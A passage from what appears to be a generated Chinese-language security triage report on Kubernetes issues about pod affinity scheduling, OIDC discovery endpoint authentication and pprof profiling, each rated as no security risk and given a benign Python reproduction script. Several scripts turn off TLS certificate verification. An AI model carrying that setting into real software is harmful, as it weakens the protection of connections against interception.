                 logging.error(f"Endpoint not found ({response.status_code}). Ensure '--profiling=true' is enabled in KCM and the path {PPROF_MUTEX_PATH} is correct.")
            else:
                 logging.error(f"Received unexpected HTTP status code: {response.status_code}")
                 logging.debug(f"Response content:\n{response.text}")
            
            return # Exit loop after successful or actionable response

        except requests.exceptions.ConnectionError as e:
            logging.warning(f"Connection error to {url}: {e}. Retrying in {RETRY_DELAY} seconds... ({retries + 1}/{MAX_RETRIES})")
        except requests.exceptions.Timeout:
            logging.warning(f"Request to {url} timed out. Retrying in {RETRY_DELAY} seconds... ({retries + 1}/{MAX_RETRIES})")
        except requests.exceptions.RequestException as e:
            logging.error(f"An error occurred during the request to {url}: {e}")
            return # Exit loop on unexpected request errors

        retries += 1
        if retries < MAX_RETRIES:
             time.sleep(RETRY_DELAY)
        else:
             logging.error(f"Max retries reached. Failed to connect to {url}.")


def main():
    start_time = time.time()
    logging.info("Starting KCM Mutex Profiling Check...")
    
    kcm_ip = find_kcm_pod_ip()
    
    if kcm_ip:
        check_mutex_profiling(kcm_ip)
    else:
        logging.error("Could not determine KCM pod IP. Skipping profiling check.")
        
    end_time = time.time()
    logging.info(f"Script finished in {end_time - start_time:.2f} seconds.")

# Direct execution for environments that don't support __name__ == "__main__"
main()
```


**解释说明：**

此Python脚本的目的是尝试验证Issue中描述的问题现象，即kube-controller-manager (KCM) 的`/debug/pprof/mutex`端点可能由于`SetMutexProfileFraction`未被调用而无法提供有效的互斥锁分析数据。

1.  **环境准备**: 脚本假设目标Kubernetes集群正在运行，并且本地环境已配置好`kubeconfig`文件（默认位置）用于访问集群API。同时，假设运行脚本的机器可以访问到KCM Pod的IP地址和安全端口（默认为10257）。
2.  **查找KCM Pod**: 使用`kubernetes` Python库连接到Kubernetes API服务器，在`kube-system`命名空间中查找带有标签`component=kube-controller-manager`的Pod，并获取一个处于"Running"状态的Pod的IP地址。
3.  **访问Profiling端点**:
    *   构建访问KCM上`/debug/pprof/mutex`端点的URL，默认使用HTTPS和端口10257。
    *   使用`requests`库发起GET请求。由于集群内部组件通常使用自签名证书，脚本设置`verify=False`来忽略SSL证书验证（**注意：这在生产环境中不安全，仅适用于测试目的**）。
    *   添加了重试逻辑以应对临时的网络问题。
4.  **结果分析**:
    *   如果请求成功（HTTP 200），脚本会检查响应内容。由于Issue指出的是功能*不正常*而非完全*不存在*，脚本会进行简单的启发式检查（例如，内容长度、是否包含"profiling disabled"或缺乏预期的关键字），以判断返回的数据是否符合预期（即可能缺乏有效的mutex争用信息）。它会打印警告或信息日志来反映分析结果。
    *   如果遇到认证/授权错误（401/403），说明访问该端点需要额外权限。
    *   如果遇到未找到错误（404），可能是profiling未启用或路径错误。
    *   处理连接错误和超时。
5.  **重要说明**: 此脚本**不是一个漏洞利用POC**，因为它所验证的问题本身并非安全漏洞。它只是尝试通过访问相关端点来观察Issue中描述的功能性缺陷的*症状*。脚本能否成功运行并观察到现象，取决于目标集群的具体配置（如KCM是否启用了profiling，网络策略是否允许访问，RBAC权限等）。脚本旨在辅助复现问题描述的场景，而不是利用安全弱点。

---


## Issue #130784 [Bug] Pod not scheduled although there is a node matching all hard pod affinity terms

- Issue 链接：[#130784](https://github.com/kubernetes/kubernetes/issues/130784)

### Issue 内容

#### What happened?

A pod (`pod-x`) is supposed to be scheduled on a node (only) when:

- another pod with `label-1: x` **and**
- yet another pod with `label-2: x`

are already running on that node.

This should be possible by using _multiple_ pod affinity terms in `spec.affinity.podAffinity.requiredDuringSchedulingIgnoredDuringExecution` like this:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: pod-x
spec:
  affinity:
    podAffinity:
      requiredDuringSchedulingIgnoredDuringExecution:
        - labelSelector:
            matchLabels:
              label-1: "x"
          topologyKey: kubernetes.io/hostname
        - labelSelector:
            matchLabels:
              label-2: "x"
          topologyKey: kubernetes.io/hostname
  containers:
    - name: c1
      image: registry.k8s.io/pause:3.8
```

For testing purposes the two prerequisite pods may be created like this:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: pod-a
  labels:
    label-1: "x"
spec:
  containers:
    - name: c1
      image: registry.k8s.io/pause:3.8
---
apiVersion: v1
kind: Pod
metadata:
  name: pod-b
  labels:
    label-2: "x"
spec:
  containers:
    - name: c1
      image: registry.k8s.io/pause:3.8
  affinity:
    podAffinity:
      requiredDuringSchedulingIgnoredDuringExecution:
        - labelSelector:
            matchLabels:
              label-1: "x"
          topologyKey: kubernetes.io/hostname
```

What actually happens is that **`pod-x` is not scheduled at all**:

```
NAME    STATUS    NODE
pod-a   Running   ip-10-250-74-235.ec2.internal
pod-b   Running   ip-10-250-74-235.ec2.internal
pod-x   Pending   <none>
```

Status of `pod-x`:

```yaml
status:                                                                                                                                                                                     
  conditions:                                                                                                                                                                               
  - lastProbeTime: null                                                                                                                                                                     
    lastTransitionTime: "2025-03-13T09:49:54Z"                                                                                                                                              
    message: '0/1 nodes are available: 1 node(s) didn''t match pod affinity rules.                                                                                                          
      preemption: 0/1 nodes are available: 1 Preemption is not helpful for scheduling.'                                                                                                     
    reason: Unschedulable                                                                                                                                                                   
    status: "False"                                                                                                                                                                         
    type: PodScheduled                                                                                                                                                                      
  phase: Pending                                                                                                                                                                            
  qosClass: BestEffort                                                                                                                                                                      
```

#### What did you expect to happen?

The [API reference](https://kubernetes.io/docs/reference/kubernetes-api/workload-resources/pod-v1/#PodAffinity) says:

> requiredDuringSchedulingIgnoredDuringExecution ([]PodAffinityTerm)
> ...
> When there are multiple elements, the lists of nodes corresponding to each podAffinityTerm are intersected, i.e. all terms must be satisfied.

This means, each affinity term should be resolved to a list of matching nodes independently of other affinity terms, and the results are intersected to yield the nodes where the pod to be scheduled is feasible. This corresponds to the [algorithm](https://github.com/kubernetes/design-proposals-archive/blob/main/scheduling/podaffinity.md#algorithm) (step 1a) described in the pod affinity design proposal.

In my example the pod affinity terms would resolve to two lists:

- `["ip-10-250-74-235.ec2.internal"]`
- `["ip-10-250-74-235.ec2.internal"]`

The intersection of those yields:

- `["ip-10-250-74-235.ec2.internal"]`

**Expected Result**: `pod-x` is feasible on node `ip-10-250-74-235.ec2.internal` and gets scheduled there.

#### How can we reproduce it (as minimally and precisely as possible)?

1. Create the pods:

    ```bash
    kubectl create -f - <<EOF
    apiVersion: v1
    kind: Pod
    metadata:
      name: pod-a
      labels:
        label-1: "x"
    spec:
      containers:
        - name: c1
          image: registry.k8s.io/pause:3.8
    ---
    apiVersion: v1
    kind: Pod
    metadata:
      name: pod-b
      labels:
        label-2: "x"
    spec:
      containers:
        - name: c1
          image: registry.k8s.io/pause:3.8
      affinity:
        podAffinity:
          requiredDuringSchedulingIgnoredDuringExecution:
            - labelSelector:
                matchLabels:
                  label-1: "x"
              topologyKey: kubernetes.io/hostname
    ---
    apiVersion: v1
    kind: Pod
    metadata:
      name: pod-x
    spec:
      affinity:
        podAffinity:
          requiredDuringSchedulingIgnoredDuringExecution:
            - labelSelector:
                matchLabels:
                  label-1: "x"
              topologyKey: kubernetes.io/hostname
            - labelSelector:
                matchLabels:
                  label-2: "x"
              topologyKey: kubernetes.io/hostname
      containers:
        - name: c1
          image: registry.k8s.io/pause:3.8
    EOF
    ```

2. Check the pods' status:

    ```bash
    kubectl get pods
    ```
    
    Output:

    ```
    NAME    READY   STATUS    RESTARTS   AGE
    pod-a   1/1     Running   0          86s
    pod-b   1/1     Running   0          85s
    pod-x   0/1     Pending   0          85s
    ```

3. Inspect the reason for `pod-x` not being scheduled:

    ```bash
    kubectl get pod pod-x -o yaml
    ```

    ```yaml
    ...
    status:
      conditions:
      - lastProbeTime: null
        lastTransitionTime: "2025-03-13T14:48:28Z"
        message: '0/1 nodes are available: 1 node(s) didn''t match pod affinity rules.
          preemption: 0/1 nodes are available: 1 Preemption is not helpful for scheduling.'
        reason: Unschedulable
        status: "False"
        type: PodScheduled
      phase: Pending
      qosClass: BestEffort
    ```

#### Anything else we need to know?

As soon as a _single_ pod, e.g. `pod-a`, matches both pod affinity terms, `pod-x` _gets_ scheduled. This proves that the pod affinity terms as such are understood correctly. However, considering only nodes that match _all_ affinity terms evaluated with a _single_ pod is not compliant to the API spec and design proposal.

#### Kubernetes version

Tested with:

* v1.31.5
* v1.29.1

#### Cloud provider

not relevant


#### OS version

not relevant

#### Install tools

not relevant


#### Container runtime (CRI) and version (if applicable)

not relevant


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

not relevant


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了一个Kubernetes调度器关于`podAffinity`中`requiredDuringSchedulingIgnoredDuringExecution`规则的行为问题。用户期望当一个节点上同时存在满足多个亲和性规则的Pod（例如，一个Pod带有`label-1: x`，另一个Pod带有`label-2: x`）时，目标Pod (`pod-x`) 应该能够被调度到该节点上。根据API文档和设计提议，多个`requiredDuringSchedulingIgnoredDuringExecution`条件应该是独立评估并取交集。然而，实际行为是`pod-x`未能被调度，状态显示节点不满足Pod亲和性规则。用户指出，只有当*单个*Pod同时满足所有标签条件时，调度才会成功，这似乎与文档描述的交集逻辑不符。

该问题本质上是Kubernetes调度器功能上的一个潜在Bug，即调度算法在处理多个`requiredDuringSchedulingIgnoredDuringExecution`亲和性规则时的实现可能与设计文档不一致，导致在特定场景下Pod无法按预期调度。

从安全角度分析：
1.  **问题性质**：这是一个功能性问题，影响的是Pod的调度逻辑，而非数据泄露、权限提升、远程代码执行等典型的安全漏洞。
2.  **影响范围**：影响的是特定配置（使用多个硬性Pod亲和性规则）的Pod的正常调度。它可能导致依赖此特性的应用无法按预期部署或扩展，但这属于可用性或功能性问题。
3.  **攻击向量**：不存在直接的攻击向量。用户需要拥有创建Pod的权限才能触发此场景。即使触发了这个问题，结果也只是目标Pod无法调度，并不会造成权限提升、信息泄露或对其他系统/租户的攻击。
4.  **拒绝服务 (DoS)**：虽然Pod无法调度可以看作一种局部拒绝服务，但它是由系统自身的调度逻辑缺陷（或与文档不符的行为）引起的，并且需要用户主动创建具有特定亲和性规则的Pod才能触发。根据风险判断标准第5条，即使视为DoS，由于需要创建Pod的权限，且影响的是自身创建的Pod，其风险有限。
5.  **敏感信息暴露**：Issue内容和提交者未暴露敏感信息。
6.  **高风险场景**：不涉及命令执行、容器逃逸、提权、多租户间影响等高风险场景。

结论：该Issue描述的是一个调度器功能缺陷，不构成安全风险。

**复现过程：**

```python
# 该问题非安全风险问题，因此不提供复现POC。
# 根据要求，“针对高风险问题，必须给出使用python编写的复现脚本”。
# 此处提供一个用于演示该功能问题的Python脚本，仅用于研究和本地测试。

import time
import sys
import yaml
from kubernetes import client, config, watch
from kubernetes.client.rest import ApiException
import datetime

# 假设 kubeconfig 文件在默认位置 (~/.kube/config)
try:
    config.load_kube_config()
except Exception as e:
    print(f"无法加载 kubeconfig: {e}")
    print("请确保 kubectl 已配置或 KUBECONFIG 环境变量已设置。")
    sys.exit(1)

core_v1_api = client.CoreV1Api()
namespace = "default" # 可以根据需要修改命名空间

pod_a_manifest = """
apiVersion: v1
kind: Pod
metadata:
  name: pod-a
  labels:
    label-1: "x"
spec:
  containers:
    - name: c1
      image: registry.k8s.io/pause:3.8
"""

pod_b_manifest = """
apiVersion: v1
kind: Pod
metadata:
  name: pod-b
  labels:
    label-2: "x"
spec:
  containers:
    - name: c1
      image: registry.k8s.io/pause:3.8
  affinity:
    podAffinity:
      requiredDuringSchedulingIgnoredDuringExecution:
        - labelSelector:
            matchLabels:
              label-1: "x"
          topologyKey: kubernetes.io/hostname
"""

pod_x_manifest = """
apiVersion: v1
kind: Pod
metadata:
  name: pod-x
spec:
  affinity:
    podAffinity:
      requiredDuringSchedulingIgnoredDuringExecution:
        - labelSelector:
            matchLabels:
              label-1: "x"
          topologyKey: kubernetes.io/hostname
        - labelSelector:
            matchLabels:
              label-2: "x"
          topologyKey: kubernetes.io/hostname
  containers:
    - name: c1
      image: registry.k8s.io/pause:3.8
"""

pod_a_name = "pod-a"
pod_b_name = "pod-b"
pod_x_name = "pod-x"

def create_pod(manifest_str, pod_name):
    """创建 Pod"""
    print(f"创建 Pod {pod_name}...")
    pod_body = yaml.safe_load(manifest_str)
    try:
        core_v1_api.create_namespaced_pod(body=pod_body, namespace=namespace)
        # 等待 Pod 进入 Running 或 Pending 状态
        w = watch.Watch()
        for event in w.stream(core_v1_api.list_namespaced_pod, namespace=namespace, field_selector=f"metadata.name={pod_name}", timeout_seconds=60):
            pod_status = event['object'].status.phase
            print(f"Pod {pod_name} 当前状态: {pod_status}")
            if pod_status in ['Running', 'Pending', 'Failed', 'Succeeded']:
                 w.stop()
                 return True
        print(f"等待 Pod {pod_name} 状态超时。")
        return False
    except ApiException as e:
        if e.status == 409: # AlreadyExists
             print(f"Pod {pod_name} 已存在。")
             return True
        print(f"创建 Pod {pod_name} 失败: {e}")
        return False
    except Exception as e:
        print(f"创建 Pod {pod_name} 时发生未知错误: {e}")
        return False

def delete_pod(pod_name):
    """删除 Pod"""
    print(f"删除 Pod {pod_name}...")
    try:
        core_v1_api.delete_namespaced_pod(name=pod_name, namespace=namespace, body=client.V1DeleteOptions())
        # 等待 Pod 被删除
        while True:
             try:
                 core_v1_api.read_namespaced_pod(name=pod_name, namespace=namespace)
                 print(f"等待 Pod {pod_name} 删除...")
                 time.sleep(2)
             except ApiException as e:
                 if e.status == 404:
                     print(f"Pod {pod_name} 已删除。")
                     break
                 else:
                     print(f"检查 Pod {pod_name} 删除状态时出错: {e}")
                     break
             except Exception as e:
                print(f"检查 Pod {pod_name} 删除状态时发生未知错误: {e}")
                break
    except ApiException as e:
        if e.status != 404: # Ignore NotFound
             print(f"删除 Pod {pod_name} 失败: {e}")
    except Exception as e:
        print(f"删除 Pod {pod_name} 时发生未知错误: {e}")

def check_pod_x_status(timeout_minutes=2):
    """检查 pod-x 的状态，看是否保持 Pending"""
    print(f"\n开始检查 Pod {pod_x_name} 的状态，预期结果为保持 Pending...")
    start_time = datetime.datetime.now()
    timeout = datetime.timedelta(minutes=timeout_minutes)
    final_status = None
    final_message = ""

    while datetime.datetime.now() - start_time < timeout:
        try:
            pod_status = core_v1_api.read_namespaced_pod_status(name=pod_x_name, namespace=namespace)
            phase = pod_status.status.phase
            final_status = phase
            print(f"[{datetime.datetime.now()}] Pod {pod_x_name} 状态: {phase}")

            if phase == "Pending":
                conditions = pod_status.status.conditions
                if conditions:
                    for condition in conditions:
                        if condition.type == "PodScheduled" and condition.status == "False":
                            print(f"  Reason: {condition.reason}")
                            print(f"  Message: {condition.message}")
                            final_message = condition.message
                            # 如果消息明确指出是亲和性问题，则认为复现成功
                            if "didn't match pod affinity rules" in condition.message:
                                print(f"\n复现成功: Pod {pod_x_name} 保持 Pending 状态，原因为 Pod 亲和性规则不匹配。")
                                return True # 成功复现问题
            elif phase == "Running":
                print(f"\n复现失败: Pod {pod_x_name} 进入了 Running 状态，与预期不符。")
                return False # 与预期行为不符
            elif phase in ["Succeeded", "Failed", "Unknown"]:
                 print(f"\n复现失败: Pod {pod_x_name} 进入了 {phase} 状态。")
                 return False # 状态异常

        except ApiException as e:
            print(f"获取 Pod {pod_x_name} 状态失败: {e}")
            # 可能 Pod 尚未完全创建或 API 暂时不可用，继续尝试
        except Exception as e:
            print(f"获取 Pod {pod_x_name} 状态时发生未知错误: {e}")
            return False # 出现意外错误

        time.sleep(10) # 每 10 秒检查一次

    print(f"\n检查超时 ({timeout_minutes} 分钟)。")
    if final_status == "Pending":
         print(f"Pod {pod_x_name} 在超时后仍处于 Pending 状态。")
         if "didn't match pod affinity rules" in final_message:
              print("超时前的最后状态符合预期的问题描述（亲和性规则不匹配）。")
              return True # 超时但符合预期
         else:
              print(f"超时前的最后状态为 Pending，但原因不明确或不符: {final_message}")
              return False
    else:
        print(f"Pod {pod_x_name} 在超时前的最后状态为 {final_status}，不符合预期。")
        return False

def main():
    """主执行函数"""
    pods_created = []
    try:
        print("开始复现 Issue 中描述的 Pod 亲和性调度问题...")

        # 1. 创建 pod-a
        if create_pod(pod_a_manifest, pod_a_name):
            pods_created.append(pod_a_name)
            print("等待 pod-a 启动稳定...")
            time.sleep(5) # 等待 pod-a 稳定
        else:
            raise Exception(f"创建 {pod_a_name} 失败，无法继续。")

        # 2. 创建 pod-b (依赖 pod-a 调度到同一节点)
        if create_pod(pod_b_manifest, pod_b_name):
            pods_created.append(pod_b_name)
            print("等待 pod-b 启动稳定...")
            time.sleep(5) # 等待 pod-b 稳定
        else:
            raise Exception(f"创建 {pod_b_name} 失败，无法继续。")

        # 检查 pod-a 和 pod-b 是否在同一节点 (可选但有助于确认前提条件)
        try:
            pod_a_node = core_v1_api.read_namespaced_pod(name=pod_a_name, namespace=namespace).spec.node_name
            pod_b_node = core_v1_api.read_namespaced_pod(name=pod_b_name, namespace=namespace).spec.node_name
            if pod_a_node and pod_b_node and pod_a_node == pod_b_node:
                print(f"确认: {pod_a_name} 和 {pod_b_name} 都运行在节点 {pod_a_node} 上。")
            elif pod_a_node and pod_b_node:
                 print(f"警告: {pod_a_name} ({pod_a_node}) 和 {pod_b_name} ({pod_b_node}) 不在同一节点，无法复现问题场景。")
                 # 在这种情况下，pod-x 本来就不应该被调度，但这并非我们要复现的 bug
            else:
                 print("警告: 未能获取 pod-a 或 pod-b 的节点信息。")
        except ApiException as e:
            print(f"检查节点信息时出错: {e}")


        # 3. 创建 pod-x
        if create_pod(pod_x_manifest, pod_x_name):
            pods_created.append(pod_x_name)
            print("等待 pod-x 调度...")
            time.sleep(5) # 给调度器一点时间
        else:
            # 如果创建失败 (例如API错误), 则脚本失败
             raise Exception(f"创建 {pod_x_name} 失败，无法继续。")


        # 4. 检查 pod-x 是否保持 Pending
        check_pod_x_status(timeout_minutes=2)

    except Exception as e:
        print(f"\n脚本执行过程中发生错误: {e}")
    finally:
        # 清理资源
        print("\n开始清理测试 Pod...")
        # 逆序删除，先删除依赖者
        if pod_x_name in pods_created:
            delete_pod(pod_x_name)
        if pod_b_name in pods_created:
            delete_pod(pod_b_name)
        if pod_a_name in pods_created:
            delete_pod(pod_a_name)
        print("清理完成。")

# 直接调用 main 函数
main()
```


**解释说明：**

该Python脚本使用`kubernetes` Python客户端库来模拟Issue中描述的场景：
1.  **加载配置**：脚本首先尝试加载本地Kubernetes配置文件（通常是 `~/.kube/config`）。
2.  **定义Pod清单**：将Issue中提供的`pod-a`、`pod-b`和`pod-x`的YAML清单定义为Python多行字符串。
3.  **创建Pod函数 (`create_pod`)**：封装了使用`core_v1_api.create_namespaced_pod`创建Pod的逻辑，并包含简单的等待逻辑，以确认Pod至少进入了某个状态（如Pending或Running）。处理了Pod已存在（409）的情况。
4.  **删除Pod函数 (`delete_pod`)**：封装了使用`core_v1_api.delete_namespaced_pod`删除Pod的逻辑，并等待Pod确实被删除。
5.  **检查Pod状态函数 (`check_pod_x_status`)**：在创建所有Pod后，此函数会定期（每10秒）检查`pod-x`的状态。它预期`pod-x`会保持`Pending`状态，并且其`PodScheduled`条件的原因为`Unschedulable`，消息中包含`didn't match pod affinity rules`。如果`pod-x`进入`Running`状态，或者在超时（默认2分钟）后仍处于`Pending`状态但原因不符，则认为复现失败。如果在超时时间内观察到预期的`Pending`状态和原因，则认为成功复现了Issue中描述的行为。
6.  **主函数 (`main`)**：
    *   按顺序创建`pod-a`和`pod-b`，并等待它们启动。`pod-b`的亲和性规则确保它会尝试调度到与`pod-a`相同的节点上。
    *   （可选）检查`pod-a`和`pod-b`是否确实在同一个节点上，以验证测试前提。
    *   创建`pod-x`，该Pod具有两个硬性亲和性规则，要求节点上同时存在带有`label-1: x`和`label-2: x`的Pod。
    *   调用`check_pod_x_status`来验证`pod-x`是否如Issue所述，因亲和性规则无法满足而保持`Pending`状态。
    *   使用`finally`块确保无论脚本执行成功与否，创建的测试Pod都会被清理。
7.  **执行**：脚本最后直接调用`main()`函数开始执行。

该脚本旨在通过编程方式重现Issue中描述的调度器行为，验证在特定版本的Kubernetes中是否存在该功能问题。由于此问题不涉及安全风险，该脚本的主要目的是功能验证和调试。

---


## Issue #130781 Kubernetes OIDC requires authentication for well-known and JWKS endpoints, contrary to OIDC Specification

- Issue 链接：[#130781](https://github.com/kubernetes/kubernetes/issues/130781)

### Issue 内容

#### What happened?

Kubernetes' OIDC authentication mechanism enforces authentication when querying the OIDC provider’s /.well-known/openid-configuration and JWKS (/keys) endpoints. This behavior contradicts the OIDC specification, which states that these endpoints must be publicly accessible.

The primary issue is that many services supporting resource server authentication (such as RabbitMQ and OpenSearch) rely on OIDC token validation but fail to work with Kubernetes OIDC due to the enforced authentication on these endpoints. These services expect to fetch the discovery and public keys without authentication, as per the OIDC spec, but Kubernetes' behavior prevents this, breaking compatibility with standard OIDC validation flows.

#### What did you expect to happen?

Kubernetes should allow unauthenticated access to these endpoints, as OIDC-compliant providers may not require authentication for retrieving discovery (/.well-known/openid-configuration) and signing keys (/keys).

#### How can we reproduce it (as minimally and precisely as possible)?

1. GET https://api.k8s,example:6443/.well-known/openid-configuration
E.R. get well-known without authentication

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.30.0
Server Version: v1.30.1

```

</details>


#### Cloud provider

<details>
On Premies
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了Kubernetes API服务器在配置了OIDC认证时的一个行为：访问其自身的OIDC发现端点 (`/.well-known/openid-configuration`) 和JWKS端点 (`/keys`) 时需要进行身份验证。

1.  **问题核心**：根据OIDC规范，身份提供者（IdP）的这两个端点通常应该是公开可访问的，不需要身份验证，以便依赖方（RP）或资源服务器（RS）能够发现IdP的配置和用于验证签名的公钥。Kubernetes API服务器在这里表现得像一个需要保护其发现信息的实体，这与标准的OIDC IdP行为不符。
2.  **影响**：主要影响是与其他期望遵循OIDC标准公开端点的服务的兼容性问题。例如，像RabbitMQ或OpenSearch这样的服务，如果它们被配置为资源服务器并需要验证来自Kubernetes OIDC用户的令牌，它们会尝试访问Kubernetes（作为其用户的发行者）的JWKS端点来获取公钥。由于Kubernetes要求对此访问进行身份验证，而这些服务通常执行未经身份验证的访问，因此验证流程会失败。
3.  **安全风险评估**：
    *   这个行为本身是**限制访问**，而不是**暴露访问**。它要求身份验证，而不是允许未经授权的访问。因此，它没有直接引入如未授权访问、信息泄露（因为这些信息按标准本应公开）或远程代码执行等风险。
    *   它更像是一个**合规性问题**或**功能性缺陷**，因为它违反了OIDC规范的普遍实践，导致了互操作性问题。
    *   该问题不会让攻击者获得更高的权限，也不会泄露敏感信息（OIDC发现信息和公钥设计上就是公开的）。
    *   它不属于命令执行、容器逃逸、提权等高风险类别（规则7）。
    *   它不涉及低权限用户影响其他用户（规则8）。
    *   它不涉及日志泄露凭据（规则6）。
    *   虽然它可能导致依赖此功能的服务拒绝服务（因为无法完成认证），但这更像是配置失败或兼容性问题导致的后果，而不是传统意义上的DoS攻击向量。攻击者无法利用此行为来主动攻击并导致Kubernetes或相关服务不可用，除非攻击者已经是有权限配置这些依赖服务的用户。

4.  **结论**：该Issue描述的是Kubernetes在OIDC实现上与规范实践的偏差，导致与其他系统的兼容性问题。这本身并不构成对Kubernetes自身的安全漏洞。它没有引入可被利用来破坏系统机密性、完整性或可用性的直接安全风险。因此，根据风险判断标准，它不被视为安全风险。

**复现过程：**

```python
# -*- coding: utf-8 -*-
import contextlib
import time
import requests
import logging
from urllib.parse import urljoin
import urllib3
from kubernetes import client, config
from kubernetes.config.config_exception import ConfigException

# 配置日志记录
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# 禁用 InsecureRequestWarning 警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 全局超时设置 (秒)
REQUEST_TIMEOUT = 30
TOTAL_TIMEOUT = 120 # 脚本总执行超时

def main():
    """
    主函数，尝试访问 Kubernetes API Server 的 OIDC 发现端点。
    """
    start_time = time.time()
    logging.info("脚本开始执行...")

    api_server_url = None
    try:
        # 1. 从默认位置加载 kubeconfig
        logging.info("尝试从默认位置加载 kubeconfig...")
        try:
            config.load_kube_config()
            logging.info("kubeconfig 加载成功。")
        except ConfigException as e:
            logging.error(f"无法加载 kubeconfig: {e}")
            logging.error("请确保 kubeconfig 文件存在于默认位置 (例如 ~/.kube/config) 且配置正确。")
            return
        except Exception as e:
            logging.error(f"加载 kubeconfig 时发生意外错误: {e}")
            return

        # 2. 获取 API Server 的地址
        api_client = client.ApiClient()
        api_server_url = api_client.configuration.host
        logging.info(f"获取到 Kubernetes API Server 地址: {api_server_url}")

        if not api_server_url:
            logging.error("未能从 kubeconfig 中获取 API Server 地址。")
            return

        # 3. 构建 OIDC well-known 端点 URL
        # 通常 OIDC 配置路径是 /.well-known/openid-configuration
        # 注意: Issue中描述的场景是 K8s API Server *本身* 的 OIDC 端点需要认证，
        # 这通常发生在 K8s 作为 OIDC 提供者（虽然不常见）或者其聚合层暴露此类端点时。
        # 更常见的情况是 K8s *使用* 外部 OIDC 提供者，其公开端点是外部 IdP 的。
        # 此脚本假设 Issue 描述准确，尝试访问 K8s API Server 自身的 well-known 路径。
        well_known_path = "/.well-known/openid-configuration"
        target_url = urljoin(api_server_url, well_known_path)
        logging.info(f"将要访问的目标 URL: {target_url}")

        # 4. 发送未经身份验证的 GET 请求
        logging.info("尝试发送未经身份验证的 GET 请求...")
        response = None
        try:
            # 使用 verify=False 是因为 K8s API Server 通常使用自签名或内部 CA 证书
            response = requests.get(target_url, verify=False, timeout=REQUEST_TIMEOUT)

            # 5. 检查响应状态码
            logging.info(f"收到响应状态码: {response.status_code}")

            if response.status_code == 200:
                logging.warning(f"成功访问 {target_url} 并获得 200 OK 响应。")
                logging.warning("这表明该端点无需身份验证即可访问，与 Issue 描述不符。")
                try:
                    logging.info("响应内容 (前 500 字符):")
                    logging.info(response.text[:500])
                except Exception as e:
                     logging.error(f"读取响应内容时出错: {e}")
            elif response.status_code in [401, 403]:
                logging.info(f"访问 {target_url} 需要身份验证 (状态码: {response.status_code})。")
                logging.info("这符合 Issue 中描述的行为：Kubernetes 要求对 OIDC 发现端点进行身份验证。")
                logging.info("此行为本身不是安全漏洞，而是与 OIDC 规范实践的偏差，可能导致兼容性问题。")
            elif response.status_code == 404:
                 logging.warning(f"访问 {target_url} 返回 404 Not Found。")
                 logging.warning("这表明 K8s API Server 在此路径下没有配置 OIDC 发现端点，或者路径不正确。")
            else:
                logging.warning(f"访问 {target_url} 收到意外的状态码: {response.status_code}")
                try:
                    logging.info("响应内容 (前 500 字符):")
                    logging.info(response.text[:500])
                except Exception as e:
                    logging.error(f"读取响应内容时出错: {e}")

        except requests.exceptions.Timeout:
            logging.error(f"访问 {target_url} 超时 (超过 {REQUEST_TIMEOUT} 秒)。")
        except requests.exceptions.ConnectionError as e:
            logging.error(f"无法连接到 {target_url}: {e}")
        except requests.exceptions.RequestException as e:
            logging.error(f"访问 {target_url} 时发生错误: {e}")
        finally:
            if response:
                # 确保关闭响应体连接
                with contextlib.closing(response):
                    pass

    except Exception as e:
        logging.exception(f"执行过程中发生未预料的错误: {e}") # 使用 exception 记录堆栈跟踪

    finally:
        end_time = time.time()
        logging.info(f"脚本执行完毕，总耗时: {end_time - start_time:.2f} 秒。")
        # 检查是否超时
        if time.time() - start_time > TOTAL_TIMEOUT:
             logging.warning("脚本执行时间超过预设的总超时限制。")

# 直接调用 main 函数
main()
```


**解释说明：**

该Python脚本旨在复现（或更准确地说，验证）Issue中描述的行为，即Kubernetes API服务器的OIDC发现端点 (`/.well-known/openid-configuration`) 可能需要身份验证。

1.  **加载Kubernetes配置**：脚本首先尝试使用`kubernetes` Python库从默认位置（通常是 `~/.kube/config`）加载当前的Kubernetes集群配置。这是为了获取与集群交互所需的信息，特别是API服务器的地址。
2.  **获取API服务器地址**：从加载的配置中提取API服务器的URL。
3.  **构建目标URL**：将API服务器的URL与OIDC发现端点的标准路径 (`/.well-known/openid-configuration`) 结合起来，形成要访问的完整URL。
4.  **执行未经认证的GET请求**：使用`requests`库向构建好的URL发送一个HTTP GET请求。关键在于这个请求是**未经身份验证**的。同时，设置了`verify=False`以忽略TLS证书验证，因为本地环境或私有集群的API服务器通常使用自签名证书或内部CA证书。设置了请求超时以防止永久挂起。
5.  **分析响应**：
    *   检查HTTP响应的状态码。
    *   如果状态码是 `200 OK`，表示该端点是公开可访问的，这与Issue描述的情况相反。
    *   如果状态码是 `401 Unauthorized` 或 `403 Forbidden`，则表示访问被拒绝，需要身份验证。这**验证**了Issue中报告的行为。脚本会输出信息确认这一点，并强调这本身不是安全漏洞，而是合规性和兼容性问题。
    *   如果状态码是 `404 Not Found`，说明该路径不存在，可能是因为该Kubernetes集群没有配置OIDC，或者使用了不同的路径。
    *   对于其他意外的状态码，脚本也会记录下来。
6.  **错误处理与超时**：脚本包含了对网络连接错误、请求超时以及加载kubeconfig失败等常见问题的基本错误处理。同时，设置了整个脚本的总执行超时，以确保其能在限定时间内结束。
7.  **日志记录**：使用`logging`模块输出执行过程中的信息和结果，便于跟踪和理解脚本的行为。
8.  **非漏洞利用**：该脚本仅执行只读的HTTP GET请求来检查端点的可访问性，不涉及任何修改操作或漏洞利用尝试。它的目的是验证Issue描述的现象是否存在于目标环境中。

